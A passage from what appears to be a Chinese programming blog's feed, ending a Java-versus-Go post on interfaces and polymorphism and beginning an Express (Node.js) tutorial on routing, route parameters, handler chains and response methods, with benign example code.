class="keyword">void</span> <span class="title function_">powerOff</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;XiaoMi Down!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">display</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is a message from XiaoMi Screen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们在运行一下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PhoneDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MobileInterface</span> <span class="variable">huawei</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HuaweiPhone</span>();</span><br><span class="line">        <span class="type">MobileInterface</span> <span class="variable">xiaomi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XiaoMiPhone</span>();</span><br><span class="line">        huawei.powerOn();</span><br><span class="line">        huawei.display(<span class="string">&quot;Hi&quot;</span>);</span><br><span class="line">        huawei.powerOff();</span><br><span class="line">        System.out.println(<span class="string">&quot;######################&quot;</span>);</span><br><span class="line">        xiaomi.powerOn();</span><br><span class="line">        xiaomi.display(<span class="string">&quot;Thank You!&quot;</span>);</span><br><span class="line">        xiaomi.powerOff();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/闲聊一下Go语言的函数方法和多态机制特点/image-20210804195155572.png" alt="image-20210804195155572" style="zoom:80%;" /></p><p>可以看到，这就是Java的多态，特点：</p><ul><li>自动向上转型、向下转型</li><li>同一接口不同实现，都是用implements关键字来声明</li><li>便于维护，如要新增方法，则在接口中增加方法、类中新增实现即可</li><li>实现一个接口必须实现它的所有方法</li></ul><p>另外有一个例子看不出来的：一个类可以实现多个接口、一个接口可以extends多个其他接口、所以接口这方面的能力非常强大。那么go语言相同的逻辑呢？</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> MobileInterface <span class="keyword">interface</span> &#123;</span><br><span class="line">    powerOn()</span><br><span class="line">    display(text <span class="type">string</span>)</span><br><span class="line">    powerOff()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HuaweiPhone <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="keyword">type</span> XiaoMiPhone <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Huawei</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *HuaweiPhone)</span></span> powerOn() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Huawei Up!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *HuaweiPhone)</span></span> powerOff() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Huawei Down!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *HuaweiPhone)</span></span> display(text <span class="type">string</span>) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;This is a message from Huawei Screen: %s\n&quot;</span>, text)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// XiaoMi</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *XiaoMiPhone)</span></span> powerOn() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Xiaomi Up!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *XiaoMiPhone)</span></span> powerOff() &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Xiaomi Down!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *XiaoMiPhone)</span></span> display(text <span class="type">string</span>) &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;This is a message from Xiaomi Screen: %s\n&quot;</span>, text)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo</span><span class="params">(phone MobileInterface)</span></span> &#123;</span><br><span class="line">    phone.powerOn()</span><br><span class="line">    phone.display(<span class="string">&quot;ohhhhh&quot;</span>)</span><br><span class="line">    phone.powerOff()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    huawei := &amp;HuaweiPhone&#123;&#125;</span><br><span class="line">    xiaomi := &amp;XiaoMiPhone&#123;&#125;</span><br><span class="line">    demo(huawei)</span><br><span class="line">    fmt.Println(<span class="string">&quot;####################&quot;</span>)</span><br><span class="line">    demo(xiaomi)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/img/闲聊一下Go语言的函数方法和多态机制特点/image-20210804200944270.png" alt="image-20210804200944270" style="zoom:80%;" /></p><p>结果是一样的，观察代码，我们可以看到如下特点：</p><ul><li>使用接收者来实现方法即可，并无显式的implements关键字等</li><li>也有自动向上向下转型的过程</li></ul><p>当然go语言中的接口也支持一个类实现多个接口，一个接口可以内嵌多个其他接口，以此实现多态。</p><p>那为什么叫非侵入式？对比Java显式的声明implements我们可以看到，Go语言没有这么做，而是我用哪个方法，我就去实现或者覆写哪个方法，对于我这个对象本身我非常的自由，<strong>选择权在我对象的手里而不是你接口或者父类的手里。</strong>这样的设计降低了复杂性，我们直接写方法就可以了无需去考虑多余的接口关系，而接口的设计者也无需去考虑谁会实现这个接口。更详细的可以参考<ahref="https://www.zhihu.com/question/66160548">go语言接口的优势？ - 知乎(zhihu.com)</a>。</p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;想闲聊一下Go语言和Java在函数方法、继承、接口、多态机制等方面的区别，这个两个在面向对象思想方面的设计是有不小区别的，具体在编程上也会有较大的区别。这篇我以Java和Go语言代码作为对比，在几个重要问题上记录下区别，帮助自己适应一下Go语言的特点。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/闲聊一下Go语言的函数方法和多态机制特点/1.jpeg&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="杂谈" scheme="https://lzwgiter.github.io/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="Go语言" scheme="https://lzwgiter.github.io/tags/Go%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>express学习（一）-基于NodeJS的Web框架</title>
    <link href="https://lzwgiter.github.io/posts/5893facf.html"/>
    <id>https://lzwgiter.github.io/posts/5893facf.html</id>
    <published>2021-07-14T02:23:57.000Z</published>
    <updated>2021-08-25T11:24:22.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>哎前端，自己就没踏踏实实学过前端的玩意儿，嚷嚷着要学vue要学angular，结果都是接触个皮毛，完后屁颠屁颠回去学Java了...，今天项目需要，学学express，一个基于NodeJS的快速开发web应用的框架(<strong>属于Nodejs的后端框架</strong>)，目的是学会基本使用。vue这些前端框架回头专门记录学学(我也好想会做好看的前端呜呜呜)</p><p><img src="/img/express学习（一）-基于NodeJS的Web框架/express-title.png" alt="express-title" style="zoom:80%;" /></p></blockquote><span id="more"></span><h2 id="入门demo">入门demo</h2><p>首先新建一个目录然后<code>npm init</code>来初始化这个工程，主要是生成<code>package.json</code>这个依赖管理文件，然后我们<code>npm install express --save</code>来安装express，可以自定义入口为app.js(一般的习惯)，然后代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;express!&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`express is listening on port: <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>然后<code>node app.js</code>就可以启动应用了，访问根目录就可以看到我们绑定的路由以及对应的handler函数了。</p><p>当然一般可以使用<code>express-generator</code>来完成这个工作，安装：<code>npm install -g express-generator</code>。然后就可以新建工程了，比如：</p><p><img src="/img/express学习（一）-基于NodeJS的Web框架/image-20210714122920878.png" alt="image-20210714122920878" style="zoom:80%;" /></p><p>然后在其目录下<code>npm install</code>安装依赖就可以了。最后的目录结构如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">├── app.js</span><br><span class="line">├── bin</span><br><span class="line">    └──www</span><br><span class="line">├── node_modules</span><br><span class="line">├── public</span><br><span class="line">│   ├─images</span><br><span class="line">│   ├─javascripts</span><br><span class="line">│   └─stylesheets</span><br><span class="line">│     └── style.css</span><br><span class="line">├── routes</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   └── users.js</span><br><span class="line">└── views</span><br><span class="line">    ├── error.pug</span><br><span class="line">    ├── index.pug</span><br><span class="line">    └── layout.pug</span><br></pre></td></tr></table></figure><p><strong>如果你要在视图层使用html作为模板文件的话，需要在app.js中修改他的默认模板引擎，并且要安装ejs模块(npminstall ejs --save)</strong>，修改后的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line"><span class="comment">// 修改视图层引擎为html</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;.html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>).<span class="property">__express</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;html&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这样就可以使用html文件了。</p><h2 id="路由设置">路由设置</h2><p>首先我们来确立几个基本概念，就照着上面的demo（这里再粘贴一下）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">9999</span></span><br></pre></td></tr></table></figure><p>首先<code>app</code>这个变量，它是express的一个实例，下面我们定义了一条路由规则：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;express!&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>定义路由规则的语法是这样的：<code>app.METHOD(URL, HANDLER)</code>，其中Handler由请求和响应组成，比如上面的代码中就用响应变量<code>res</code>回执了一个字符串。</p><h3 id="url路径">URL路径</h3><p>官方给了几个例子，分别对应不同的HTTP请求：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求根</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求/about页面</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/about&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;about&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求/random.text</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/random.text&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;random.text&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 附带规则</span></span><br><span class="line"><span class="comment">// 请求abd或者abcd，b?意思就是有没有?前面这个b都可以</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ab?cd&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;ab?cd&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类似上面，意思中间可以是一堆b，比如abbbbcd</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ab+cd&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;ab+cd&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和上面一个意思，只不过中间可以不是b，比如abq345281cd</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ab*cd&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;ab*cd&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 和ab?cd一个意思，即cd这俩可有可无=&gt;abe或者abcde</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/ab(cd)?e&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;ab(cd)?e&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则</span></span><br><span class="line"><span class="comment">// 只要带个a就可以访问</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="regexp">/a/</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;/a/&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以fly结尾就可以，比如butterfly</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="regexp">/.*fly$/</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&#x27;/.*fly$/&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="路由参数">路由参数</h3><p>当然我们也要处理用户传递的数据的，老规矩，get的参数或者post的参数呗。先看get的，处理方法类似go语言：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/users/:userId/books/:bookId&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">send</span>(req.<span class="property">params</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上面这个url传递过来后，就可以拿到userId和bookId这两个变量</p><p>当然，你也可以用这种骚气一点的处理方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 带个&#x27;-&#x27;来匹配get的参数</span></span><br><span class="line"><span class="title class_">Route</span> <span class="attr">path</span>: <span class="regexp">/flights/</span>:<span class="keyword">from</span>-:to</span><br><span class="line"><span class="title class_">Request</span> <span class="attr">URL</span>: <span class="attr">http</span>:<span class="comment">//localhost:3000/flights/LAX-SFO</span></span><br><span class="line">req.<span class="property">params</span>: &#123; <span class="string">&quot;from&quot;</span>: <span class="string">&quot;LAX&quot;</span>, <span class="string">&quot;to&quot;</span>: <span class="string">&quot;SFO&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同理，也可以用&#x27;.&#x27;来分隔匹配参数</span></span><br><span class="line"><span class="title class_">Route</span> <span class="attr">path</span>: <span class="regexp">/plantae/</span>:genus.:species</span><br><span class="line"><span class="title class_">Request</span> <span class="attr">URL</span>: <span class="attr">http</span>:<span class="comment">//localhost:3000/plantae/Prunus.persica</span></span><br><span class="line">req.<span class="property">params</span>: &#123; <span class="string">&quot;genus&quot;</span>: <span class="string">&quot;Prunus&quot;</span>, <span class="string">&quot;species&quot;</span>: <span class="string">&quot;persica&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 当然，还有正则</span></span><br><span class="line"><span class="title class_">Route</span> <span class="attr">path</span>: <span class="regexp">/user/</span>:<span class="title function_">userId</span>(\d+)</span><br><span class="line"><span class="title class_">Request</span> <span class="attr">URL</span>: <span class="attr">http</span>:<span class="comment">//localhost:3000/user/42</span></span><br><span class="line">req.<span class="property">params</span>: &#123;<span class="string">&quot;userId&quot;</span>: <span class="string">&quot;42&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="处理程序handler">处理程序(Handler)</h3><p>上面demo的例子只有一个handler函数，实际上也可以组合使用多个handler函数进行跳转，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this request will be handled by next!&quot;</span>)</span><br><span class="line">    <span class="title function_">next</span>()<span class="comment">// 交由下一个handler处理</span></span><br><span class="line">&#125;, <span class="function">(<span class="params">req, res</span>)=&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`express is listening on port: <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们就可以在控制台看到跳转，以及最终回显的结果</p><figure><imgsrc="/img/express学习（一）-基于NodeJS的Web框架/image-20210714142325049.png"alt="image-20210714142325049" /><figcaption aria-hidden="true">image-20210714142325049</figcaption></figure><figure><imgsrc="/img/express学习（一）-基于NodeJS的Web框架/image-20210714142212956.png"alt="image-20210714142212956" /><figcaption aria-hidden="true">image-20210714142212956</figcaption></figure><p>当然你也可以单独独立定义函数，然后组成数组，交由app来进行管理：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func1 = <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this is func1&quot;</span>)</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func2 = <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this is func2&quot;</span>)</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func3 = <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;hello!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/test&#x27;</span>, [func1, func2, func3])</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`express is listening on port: <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure><imgsrc="/img/express学习（一）-基于NodeJS的Web框架/image-20210714142724475.png"alt="image-20210714142724475" /><figcaption aria-hidden="true">image-20210714142724475</figcaption></figure><figure><imgsrc="/img/express学习（一）-基于NodeJS的Web框架/image-20210714142731697.png"alt="image-20210714142731697" /><figcaption aria-hidden="true">image-20210714142731697</figcaption></figure><p>上面的例子是都绑定到了get方法，此外，你也可以将这些方法绑定到不同的方法里：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">route</span>(<span class="string">&#x27;/book&#x27;</span>)</span><br><span class="line">  .<span class="title function_">get</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Get a random book&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">post</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Add a book&#x27;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">put</span>(<span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;Update the book&#x27;</span>)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p>比如上面的代码就把不同的处理程序绑定到了<code>/book</code>路径下的不同请求方法中。</p><h3 id="响应可执行的方法method">响应可执行的方法(Method)</h3><p>如果以下的方法没有被调用的话，服务端和客户端的通信将一直挂起。比如我们demo里的send方法就可以结束一次请求-响应的循环。</p><table><colgroup><col style="width: 50%" /><col style="width: 50%" /></colgroup><thead><tr class="header"><th>Method</th><th>Description</th></tr></thead><tbody><tr class="odd"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.download">res.download()</a></td><td>Prompt a file to be downloaded.</td></tr><tr class="even"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.end">res.end()</a></td><td>End the response process.</td></tr><tr class="odd"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.json">res.json()</a></td><td>Send a JSON response.</td></tr><tr class="even"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.jsonp">res.jsonp()</a></td><td>Send a JSON response with JSONP support.</td></tr><tr class="odd"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.redirect">res.redirect()</a></td><td>Redirect a request.</td></tr><tr class="even"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.render">res.render()</a></td><td>Render a view template.</td></tr><tr class="odd"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.send">res.send()</a></td><td>Send a response of various types.</td></tr><tr class="even"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.sendFile">res.sendFile()</a></td><td>Send a file as an octet stream.</td></tr><tr class="odd"><td><ahref="https://www.expressjs.com.cn/en/4x/api.html#res.sendStatus">res.sendStatus()</a></td><td>Set the response status code and send its string representation asthe response 